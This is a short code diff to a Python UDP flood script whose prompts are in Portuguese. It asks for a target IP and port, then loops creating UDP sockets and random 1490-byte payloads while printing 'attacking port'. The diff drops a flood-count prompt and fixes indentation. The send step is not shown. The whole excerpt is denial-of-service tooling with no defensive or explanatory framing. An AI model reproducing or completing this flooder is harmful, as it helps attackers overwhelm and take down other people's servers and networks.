@@ -57,7 +57,6 @@ time.sleep(1)
 
 IP = input("Digite o IP: ")
 Porta = input("Porta: ")
-Flood = input("Numero de flood: ")
 print("O IP e: ", IP)
 print("A Porta e: ", Porta)
 
@@ -67,7 +66,7 @@ os.system("clear")
 time.sleep(1)
 
 for x in range(50):
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-print('Atacando porta 💥')
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1490)
+    print('Atacando porta 💥')
 
